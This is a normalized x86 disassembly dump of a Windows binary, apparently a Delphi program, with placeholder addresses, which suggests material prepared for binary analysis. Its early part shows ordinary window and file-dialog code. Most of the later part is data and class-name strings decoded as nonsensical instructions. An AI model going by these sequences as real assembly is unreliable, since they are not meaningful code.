mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
pop eax
call sub_409070
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_455a7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
xor edx edx
call sub_455a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_455a7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_435c18
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_455a7c
sub_439bd0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_439ca8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_45540c
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_4553ec
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_4551bc
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_435c18
lea eax [ ebx + 0xcc ]
call sub_403f7c
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_455a7c
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_459a7c
mov eax ebx
call sub_4320a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439caf
lea eax [ ebp - 0x34 ]
call sub_403f7c
retn
sub_439ce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_439f4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439f32
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46eef8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455a7c
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_46f878
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_46fed8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_435fd4
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_455a7c
mov dl 0x5
mov eax ebx
call sub_454f60
xor edx edx
mov eax ebx
call sub_436424
mov dl 0x1
mov eax ebx
call sub_436478
mov edx 0x5
mov eax ebx
call sub_43645c
mov edx 0xff000005
mov eax ebx
call sub_455bec
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ sub_4345dc ]
call sub_43582c
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_454f60
mov dl 0x1
mov eax esi
call sub_435c28
mov dl 0x1
mov eax esi
call sub_435c58
mov dl 0x1
mov eax esi
call sub_435c00
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427dd8
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f39
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
call sub_455450
mov esi eax
mov eax ebx
call sub_455450
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427dd8
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_46fa48
call sub_4731c4
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_42c260
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46ee98
mov eax [ ebp - 0x4 ]
call sub_455494
mov esi eax
mov eax ebx
call sub_455494
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427df0
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_46fa48
call sub_473190
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_42c260
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46eec8
add eax 0x3
sub_439fa4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x44 ] eax
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax r-xdata
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx GetSaveFileNameA
mov eax ebx
call sub_432468
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_439fe8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a033
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_42bc18
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_404388
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a03a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_43a040
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a065
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a06c
retn
sub_43a087
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43a0cc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a0d3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a04
sub_43a0ef
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43a134
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a13b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a04
sub_43a14b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a1a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a1a8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f7c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a1b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a1f8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a1ff
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a210
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edx - 0x5d53ffbd ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1c0043a2 ] dl
add [ eax ] al
add [ eax ] ch
push 0x34340041
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x69 ] ch
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add [ eax ] ah
scasd [ edi ]
inc ebx
add ah dh
scasd [ edi ]
inc ebx
add [ eax + ebx * 4 - 0x671bffbf ] dh
inc ecx
add ah bl
cwde
inc ecx
add [ eax + 0x200043af ] bh
mov al 0x43
add [ eax + esi * 4 ] bh
inc ebx
add [ eax - 0x50 ] cl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
or cl [ ecx + 0x6d ]
inc ebx
outsd
outsb
je r-xdata
pop es
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
and [ ebx + 0x12030043 ] ah
popad
dec ecx
outsb
js r-xdata
outsd
insb
dec ecx
je r-xdata
dec ecx
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
add al 0x4c
outsd
jb r-xdata
insd
nop
lodsb [ esi ]
mov [ 0x10070043 ] al
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
outsb
je r-xdata
jae r-xdata
insd
outsd
add [ eax ] al
add [ esp + 0x43 ] bl
inc ebx
outsd
jae r-xdata
push esp
jns r-xdata
je r-xdata
insb
dec ecx
je r-xdata
add [ eax ] ch
add [ eax ] al
add [ ecx + ebp * 2 + 0x34340041 ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
pop esp
movsb [ edi ] [ esi ]
inc ebx
outsd
insb
dec ecx
je r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
pop eax
mov [ 0x68b40043 ] al
inc ecx
add [ edx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x34 ] cl
inc eax
inc eax
inc ebx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] bl
inc ebx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
and [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
popad
jo r-xdata
add ah ah
pop esp
movsd [ edi ] [ esi ]
inc ebx
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
outsd
insb
dec ecx
je r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
xor al 0x40
outsd
insb
dec ecx
je r-xdata
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
dec esi
outsd
outsb
push es
jae r-xdata
dec esp
add eax 0x6d657449
xor [ eax ] edx
push esp
nop
insb
mov [ 0x11080043 ] eax
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x706d6f43
popad
jb r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb [ eax ] al
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ eax ] eax
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
outsb
je r-xdata
add [ eax ] cl
adc dl [ ecx + ecx * 2 + 0x74 ]
insd
add [ ebp + 0x43 ] bl
push 0x200043a3
add [ eax ] eax
or [ ebx + 0x6f ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
add [ esp + esi + 0x40 ] al
xor al 0x40
insd
or [ 0x6d657449 ] al
xor dl [ eax ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ eax - 0x62 ] al
inc ecx
add ah dh
popfd
inc ecx
add al bh
popfd
inc ecx
add [ edx + ebx * 4 + 0x41 ] ah
add al ah
0xb0c00041 0x43
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ecx
inc ebx
outsd
outsb
je r-xdata
inc esp
popad
je r-xdata
mov [ 0xffffffffc08b0043 ] al
inc ebp
jbe r-xdata
outsd
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
shl [ esp + 0x43 ] 0x0
pop es
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add ah al
insb
xchg esp eax
outsd
push es
jae r-xdata
xor [ ebx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
outsb
je r-xdata
add [ 0x756c6156 ] eax
dec ecx
outsb
je r-xdata
je r-xdata
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
mov eax eax
insb
cmpsb [ esi ] [ edi ]
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
inc ebx
jne r-xdata
jmp [ eax ]
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
cdq
insd
pop es
je r-xdata
push esp
js r-xdata
imul esi [ ebx + 0x74 ] 0x694c5411
jae r-xdata
or [ esp + ecx * 2 ] al
inc edx
add [ eax + 0x34 ] cl
inc eax
imul ebp [ esi + 0x67 ] 0x6d490a01
add [ esp + esi ] bh
inc eax
add [ eax ] al
add [ eax ] al
add al dl
cmpsd [ esi ] [ edi ]
inc ebx
add al bl
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
hlt
sbb [ esi ] eax
xor al 0x25
sbb al 0x42
add al bl
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add al bl
xchg ebx eax
inc ecx
add [ eax ] ch
mov ah 0x43
add [ eax - 0x27ffbde4 ] bl
inc esi
add [ eax + 0x20 ] ch
inc esi
add [ esi + edx + 0x42 ] ah
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
outsd
insd
jo r-xdata
outsd
insb
dec ecx
je r-xdata
jb r-xdata
dec ecx
outsb
je r-xdata
push es
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
je r-xdata
push esi
popad
insb
jne r-xdata
push es
add eax 0x756c6156
add [ eax + 0x48004213 ] dh
xor al 0x40
inc edx
add [ eax + 0x34 ] al
inc eax
popad
dec ecx
outsb
js r-xdata
outsb
add [ bp + si ] ecx
dec ecx
insd
inc esi
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ edx + esi * 4 + 0x43 ] ch
add [ eax + 0x1d ] bl
inc edx
add ah bh
sbb al 0x42
add [ esp + esi * 4 ] ah
inc ebx
add al al
sbb al 0x42
add ah al
mov dl 0x43
add [ ebx + ebx ] ch
inc esi
add [ ebx + 0x46 ] bl
add ah dh
and al [ esi ]
mov [ esi ] ah
inc esi
add ah ch
mov bl 0x43
add [ eax ] bl
mov ah 0x43
add [ esi + esi * 4 ] ah
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] bl
and [ esi ] al
outsd
insb
add [ eax - 0x5a ] ch
inc ebx
add [ ebx + edx - 0xb6fffbb ] dh
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] ah
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
inc ebp
jbe r-xdata
jb r-xdata
add [ eax ] al
inc ebx
add [ eax ] ah
insd
jae r-xdata
inc eax
add [ eax + 0x60004031 ] ah
adc [ eax ] al
add [ eax - 0x5c ] dh
inc ebx
add [ eax - 0x57ffbc5e ] ch
jb r-xdata
inc edx
outsd
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
jl r-xdata
insb
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
jo r-xdata
and [ esi ] al
push 0x64004620
push ss
inc edx
add al bl
xchg ebx eax
inc ecx
add [ eax ] ch
mov ah 0x43
add [ eax - 0x27ffbde4 ] bl
sbb [ esi ] eax
xor al 0x25
inc esi
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ edx + esi * 4 + 0x43 ] ch
add [ eax + 0x1d ] bl
inc edx
add ah bh
inc eax
add [ eax + 0x18004031 ] ah
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0x68007265
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + edx + 0x40 ] dl
add ah ah
adc [ eax ] al
push esp
adc [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
jo r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] bl
xor al 0x40
jb r-xdata
add [ eax ] al
add [ eax + 0x5c0043a5 ] ch
sbb al [ edx ]
inc eax
xor al 0x40
push ebx
je r-xdata
push es
adc [ ebp + 0x12080043 ] ah
push esp
inc edi
je r-xdata
inc ebx
popad
jae r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ edx + ebp * 2 + 0x41 ] al
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
dec ecx
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
inc esi
adc [ eax ] al
enter 0x0 0xff
enter 0x43b5 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
insd
dec ecx
outsb
js r-xdata
js r-xdata
js r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
test [ edi + 0x41 ] bl
add [ eax + eax ] dh
dec [ eax ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x42
add [ esp + esi * 4 ] ah
inc ebx
add al al
sbb al 0x42
add ah al
mov dl 0x43
add [ ebx + ebx ] ch
inc esi
add [ ebx + 0x46 ] bl
add ah dh
and al [ esi ]
mov [ esi ] ah
inc esi
add ah ch
mov bl 0x43
add [ eax - 0x4a ] bh
inc ebx
add [ esi + esi * 4 ] ah
inc ebx
add [ edx ] dl
push esp
push esi
imul esi [ edx + 0x74 ] 0x4c6c6175
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
nop
call 0x743eb90
adc dl [ esi + edx * 2 + 0x69 ]
jb r-xdata
inc ebx
add [ eax - 0x5a ] ch
inc ebx
add [ ecx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
outsb
add al [ 0x65646e49 ]
js r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
popad
je r-xdata
inc esp
add al 0x44
je r-xdata
je r-xdata
outsb
push ebx
outsb
jae r-xdata
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65736143
add [ eax ] al
adc [ eax ] al
sbb al 0x0
arpl [ esi + ebp * 2 + 0x73 ] si
movsd [ edi ] [ esi ]
inc ebx
add al al
add [ eax ] al
push ebx
push 0x4374726f
jne r-xdata
pop edi
inc ecx
add [ eax + eax + 0x2470ff00 ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] bh
push [ ebx + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
[ ebp + esi * 4 + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
in al 0x10
inc eax
add [ eax + eax ] ah
call [ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
popad
jo r-xdata
add [ eax ] al
adc [ eax ] al
mov al [ 0x5cff0000 ]
mov ah 0x43
add [ ecx ] al
add [ esi + 0x43 ] dl
add ah cl
add [ eax ] al
add [ eax + 0x5c004617 ] dl
sbb al [ edx ]
inc eax
xor al 0x40
push ebx
insb
insd
jae r-xdata
insd
inc ebx
outsd
jne r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
push esp
pop ss
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
rol [ eax ] 0x0
jae r-xdata
insd
inc ebx
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
inc ebx
push 0x64004620
push ss
inc edx
outsd
je r-xdata
add [ 0x6e756f43 ] eax
je r-xdata
push esp
inc ebx
jne r-xdata
jb r-xdata
jbe r-xdata
cmp al 0x34
jb r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
add [ eax ] al
add [ ebx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x2c43ee3f
add [ eax ] al
add ah ah
mov [ 0x34340043 ] eax
insd
inc ebp
jbe r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
aam 0x24
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x98656c62
cmpsb [ esi ] [ edi ]
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000d ] al
outsb
inc edi
je r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] 0xaa10c08b
inc ebx
add [ eax ] cl
or eax 0x74654754
dec ecx
je r-xdata
adc [ eax ] al
push es
dec edi
je r-xdata
inc ebx
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000e ] al
outsb
inc edi
je r-xdata
movsd [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
sub al 0x17
inc esi
add [ eax ] cl
inc esi
add [ eax ] dh
inc esi
add [ esi + 0x46 ] ah
arpl [ gs : ebp + 0x64 ] si
insb
jbe r-xdata
add [ eax - 0x5a ] ch
inc ebx
add [ eax + edx + 0x40 ] dl
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cmpsb [ esi ] [ edi ]
inc ebx
je r-xdata
sbb al 0xa3
inc ebx
add [ 0xff0000 ] bl
mov dl 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc eax
xor al 0x40
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
jae r-xdata
add al 0x49
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
dec ecx
je r-xdata
je r-xdata
add [ ebx ] al
or [ esi ] al
insd
inc ebx
outsd
jne r-xdata
outsb
arpl [ ecx + ebp * 2 + 0x6f ] si
je r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x43 ] ch
jb r-xdata
adc eax [ ebp ]
nop
hlt
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ fs : eax ] al
je r-xdata
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ ebx + 0xe00043 ]
add [ eax ] al
test al 0xa5
inc ebx
add [ edx + ebx + 0x42 ] bl
je r-xdata
inc ecx
add [ esi + ebx * 4 ] bh
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add ah cl
mov al [ 0x60004031 ]
cdq
insd
adc [ esp + ecx * 2 + 0x69 ] dl
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
add [ eax - 0x80000000 ] al
or al 0xa5
insd
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
jae r-xdata
je r-xdata
push 0x540043a6
adc [ eax ] al
inc ebx
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
jl r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x46 ] ch
inc ebx
add [ eax + 0x20 ] ch
mov al 0x13
inc edx
add [ eax + 0x34 ] cl
inc eax
insd
jae r-xdata
inc ecx
sahf
outsd
insb
dec ecx
je r-xdata
je r-xdata
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
